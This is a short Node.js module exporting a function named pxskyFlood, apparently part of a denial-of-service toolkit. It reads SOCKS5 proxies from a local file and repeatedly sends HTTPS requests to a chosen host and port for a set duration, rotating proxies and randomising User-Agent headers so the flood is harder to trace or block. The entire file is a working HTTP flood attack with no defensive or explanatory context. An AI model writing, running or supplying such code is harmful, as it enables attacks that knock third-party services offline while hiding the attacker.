const { SocksProxyAgent } = require('socks-proxy-agent');
const https = require('https');

function pxskyFlood(host, port, duration) {
  const end = Date.now() + duration*1000;
  const proxies = require('fs').readFileSync('./proxy.txt','utf8').split(/\r?\n/).filter(Boolean);
  function run(){
    if(Date.now() > end) return;
    const proxy = proxies[Math.floor(Math.random()*proxies.length)];
    const agent = new SocksProxyAgent(`socks5://${proxy}`);
    https.get({host, port, path:'/', agent, headers:{'User-Agent':global.randUA()}}, run).on('error', run);
  }
  run();
}
module.exports = { pxskyFlood };